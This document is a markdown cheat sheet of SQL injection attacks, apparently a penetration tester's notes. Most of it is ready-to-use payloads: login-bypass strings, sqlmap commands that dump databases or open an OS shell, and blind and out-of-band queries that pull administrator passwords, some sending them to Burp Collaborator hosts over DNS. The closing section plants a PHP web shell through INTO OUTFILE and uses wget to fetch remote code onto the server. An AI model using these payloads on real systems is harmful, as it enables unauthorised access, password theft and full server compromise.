# SQL Injection
* [Login Bypass](#login-bypass)
* [sqlmap](#sqlmap)
  * [General Commands](#general-commands)
  * [Enumerate a Vulnerable Database](#enumerate-a-vulnerable-database)
* [Union Attack](#union-attack)
  * [Determine number of columns](#determine-number-of-columns)
  * [Find columns with usefull data types](#find-columns-with-usefull-data-types)
  * [Retrieve interesting data](#retrieve-interesting-data)
  * [Retrieving multiple values in a single column](#retrieving-multiple-values-in-a-single-column)
* [Examining the database in SQL injection attacks](#examining-the-database-in-sql-injection-attacks)
  * [Querying the database type and version](#querying-the-database-type-and-version)
* [Write reverse shell with database](#write-reverse-shell-with-database)

## Login Bypass
| Info | Command | 
|:-----|:--------|
| ffuf (Automated) | `ffuf -X POST -request request.txt -w /usr/share/seclists/Fuzzing/SQLi/Auth_Bypass.txt:UNAME -w /usr/share/seclists/Fuzzing/SQLi/Auth_Bypass.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790` |
| Manual Login bypass | `or 1=1` |
| Manual Login bypass | `or 1=1--` |
| Manual Login bypass | `or 1=1#` |
| Manual Login bypass | `or 1=1/*` |
| Manual Login bypass | `admin' --` |
| Manual Login bypass | `admin' #` |
| Manual Login bypass | `admin'/*` |
| Manual Login bypass | `admin' or '1'='1` |
| Manual Login bypass | `admin' or '1'='1'--` |
| Manual Login bypass | `admin' or '1'='1'#` |
| Manual Login bypass | `admin' or '1'='1'/*` |
| Manual Login bypass | `admin'or 1=1 or ''='` |
| Manual Login bypass | `admin' or 1=1` |
| Manual Login bypass | `admin' or 1=1--` |
| Manual Login bypass | `admin' or 1=1#` |
| Manual Login bypass | `admin' or 1=1/*` |
| Manual Login bypass | `admin') or ('1'='1` |
| Manual Login bypass | `admin') or ('1'='1'--` |
| Manual Login bypass | `admin') or ('1'='1'#` |
| Manual Login bypass | `admin') or ('1'='1'/*` |
| Manual Login bypass | `admin') or '1'='1` |
| Manual Login bypass | `admin') or '1'='1'--` |
| Manual Login bypass | `admin') or '1'='1'#` |
| Manual Login bypass | `admin') or '1'='1'/*` |
| Manual Login bypass | `1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055` |
| Manual Login bypass | `admin" --` |
| Manual Login bypass | `admin" #` |
| Manual Login bypass | `admin"/*` |
| Manual Login bypass | `admin" or "1"="1` |
| Manual Login bypass | `admin" or "1"="1"--` |
| Manual Login bypass | `admin" or "1"="1"#` |
| Manual Login bypass | `admin" or "1"="1"/*` |
| Manual Login bypass | `admin"or 1=1 or ""="` |
| Manual Login bypass | `admin" or 1=1` | 
| Manual Login bypass | `admin" or 1=1--` |
| Manual Login bypass | `admin" or 1=1#` | 
| Manual Login bypass | `admin" or 1=1/*` |
| Manual Login bypass | `admin") or ("1"="1` | 
| Manual Login bypass | `admin") or ("1"="1"--` |
| Manual Login bypass | `admin") or ("1"="1"#` |
| Manual Login bypass | `admin") or ("1"="1"/*` |
| Manual Login bypass | `admin") or "1"="1` |
| Manual Login bypass | `admin") or "1"="1"--` |
| Manual Login bypass | `admin") or "1"="1"#` | 
| Manual Login bypass | `admin") or "1"="1"/*` |
| Manual Login bypass | `1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055` |

## sqlmap
### General Commands
| Info | Command | 
|:-----|:--------|
| Test a single parameter | `sqlmap -u "http://$ip//kzMb5nVYJw/search.php?usrtosearch="`
| Use Burpsuite request | `sqlmap -r request.txt`
| Crawl a website | `sqlmap -u http://example.com --crawl=1`

### Enumerate a vulnerable Database
| Description        | Command |
|--------------------|---------|
| List the Databases | `sqlmap -u "https://$ip/page?p1=value1" --dbs` |
| List Tables of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB --tables` |
| List Columns of Table TARGET_TABLE of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1""-D TARGET_DB -T TARGET_TABLE --columns` |
| Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump` |
| Fully Dump Table TARGET_TABLE of Database TARGET_DB | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB -T TARGET_TABLE --dump` |
| Dump full Database | `sqlmap -u "https://$ip/page?p1=value1" -D TARGET_DB --dump` | 
| Custom SQL query | `sqlmap -u "https://$ip/page?p1=value1" --sql-query "SELECT * FROM TARGET_DB;"` | 
| Get OS Shell | `sqlmap -u "https://$ip/page?p1=value1" --os-shell` |
| Get SQL shell | `sqlmap -u "https://$ip/page?p1=value1" --sqlmap-shell` |

## Union Attack
### Determine number of columns
| Info | Command | 
|:-----|:--------|
| Determine number of columns | `' ORDER BY 1--` |
| Determine number of columns | `' ORDER BY 2--` |
| Determine number of columns | `' ORDER BY 3--` |
| Determine number of columns | `' UNION SELECT NULL--` |
| Determine number of columns | `' UNION SELECT NULL,NULL--` |
| Determine number of columns | `' UNION SELECT NULL,NULL,NULL--` |
| Determine number of columns | `' ORDER BY 1#` |
| Determine number of columns | `' ORDER BY 2#` |
| Determine number of columns | `' ORDER BY 3#` |

### Find columns with usefull data types
| Info | Command | 
|:-----|:--------|
| Check column 1 | `'UNION SELECT 'a',NULL,NULL,NULL--` |
| Check column 2 | `'UNION SELECT NULL,'a',NULL,NULL--` |
| Check column 3 | `'UNION SELECT NULL,NULL,'a',NULL--` |
| Check column 4 | `'UNION SELECT NULL,NULL,NULL,'a'--` |
| Check column 4 | `'UNION SELECT NULL,NULL,NULL,'a'--` |
| Oracle requires a from statement dual should work for all | `'+UNION+SELECT+'abc','def'+FROM+dual--` |

### Retrieve interesting data
| Info | Command | 
|:-----|:--------|
| Get data | `' UNION SELECT username, password FROM users--` |

# Retrieving multiple values in a single column
| Info | Command | 
|:-----|:--------|
| Oracle | `' UNION SELECT username \|\| '~' \|\| password FROM users-- ` |
| Microsoft | `' UNION SELECT 'foo'+'bar' FROM users-- ` |
| PostgreSQL | `' UNION SELECT foo\|\|bar FROM users-- ` |
| PostgreSQL | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| MySQL | `' UNION SELECT 'foo' 'bar' FROM users-- ` | 
| MySQL | `' UNION SELECT CONCAT('foo','bar') FROM users-- ` |

## Examining the database in SQL injection attacks
### Querying the database type and version
| Database type  | Query | 
|:---------------|:------|
| Microsoft | `SELECT @@version` |
| MySQL | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |
| Oracle | `SELECT version FROM v$instance` |
| PostgreSQL | `SELECT version()` |

 For example, you could use a UNION attack with the following input:

`' UNION SELECT @@version--`

### Listing the contents of the database
| Info | Command |
|:-----|:--------|
| Non Oracle - Show tables | `SELECT TABLE_NAME FROM information_schema.tables ` |
| Non Oracle - Show columns | `SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'Users'` | 
| Oracle - Show tables | `SELECT * FROM all_tables` |
| Oracle - Show columns  | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |


## Blind SQL Injection
### With some kind of response
If the application acts differently but doesn't return data then the following techniques will be helpful. 

| Info | Command |
|:-----|:--------|
| Verify that the users table exists | `' AND (SELECT 'a' FROM users LIMIT 1)='a` |
| Verify that the administrator user exists | `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
| Determine number of characters in administrator password (Greater than 1) | `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` |
| Determine number of characters in administrator password (Greater than 3) | `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a` |
| Test a character from the administrator password | `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` |

### Completely Blind
#### Cause error responses
| Info | Command |
|:-----|:--------|
| Observer response time (Working) | `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` |
| Observer response time (No Working) | `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` |
| Verify user table exists | `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` |
| Verify administrator exists in users table | `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` |
| Enumerate password size > 1 | `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` |
| Enumerate password size > 5 | `'||(SELECT CASE WHEN LENGTH(password)>5 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` |
| Retrive data using this technique (First letter of password)| `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` |
| Retrive data using this technique | `' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

#### Using time delays
| Info | Command |
|:-----|:--------|
| Test delay (Should not delay) | `'; IF (1=2) WAITFOR DELAY '0:0:10'--` |
| Test delay (Should delay) | `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
| Test a single character | `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--` |
| PostgreSQL | `' || pg_sleep(10)--` |
| Microsoft | `WAITFOR DELAY '0:0:10'`
| MySQL | `SELECT sleep(10)`
| Oracle | `dbms_pipe.receive_message(('a'),10)`
| Verify sleep clause | `' || (SELECT CASE WHEN (1=1) then pg_sleep(10) else pg_sleep(-1)end)--` |
| Verify administrator in users tables | `' || (SELECT CASE WHEN (username='administrator') then pg_sleep(10) else pg_sleep(-1) end FROM users)--` |
| Enumerate password size > 1 | `'||(SELECT CASE WHEN LENGTH(password)>1 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')--` |
| Enumerate password size > 5 | `'||(SELECT CASE WHEN LENGTH(password)>5 THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')--` |
| Retrive data using this technique (First letter of password)| `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN pg_sleep(10) ELSE '' END FROM users WHERE username='administrator')--` |

#### Using out-of-band (OAST)
| Info | Command |
|:-----|:--------|
| Basic OAST - Microsoft | `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--` |
| Blind OAST - Oracle with XXE | `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--` |
| Blind OAST - PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'` |
| Blind OAST - MySQL | `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |

#### DNS lookup with data exfiltration
Oracle | ' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users WHERE username='administrator')||'.1vx49ushnfj373s5igzwt4diq9wzko.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--` |
| Microsoft | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"') ` |
| MySQL (Windows Only) | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` | 

* PostgreSQL
```SQL
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f(); 
```

## Write reverse shell with database


https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/
https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/

| Description | Command | 
|-------------|---------|
| Check for write privileges | `union select 1,2,3,concat(user(),0x3a,file_priv) from mysql.user--` | 

If it says Y after your current user, then you are lucky and you have write privileges.
Create a file to receive the shell

Now it's time to make use of MySQL statements. We're going to use INTO OUTFILE, which writes your selected rows onto a file. The basic syntax is:

select column_name from table_name into outfile "filepath/file.extension

Something like this should create a file named shell.php in the website directory and write that PHP code inside it:

http://website.com/file.php?id=1 union select 1,"<?php system($_REQUEST['cmd'])?>",3,4 INTO OUTFILE " /var/www/website/public_html/shell.php"

Access the shell

Now we can access our shell by visiting http://website.com/shell.php?cmd=whoami. You can run any command after cmd=. You can now upload a ready-made shellcode to the server using curl or `wget (on Linux servers):

`http://website.com/shell.php?cmd=wget http://othersite.com/shell.txt -O code.php`

And then you can access your shell with:

http://website.com/code.php

Hope you understood everything :)

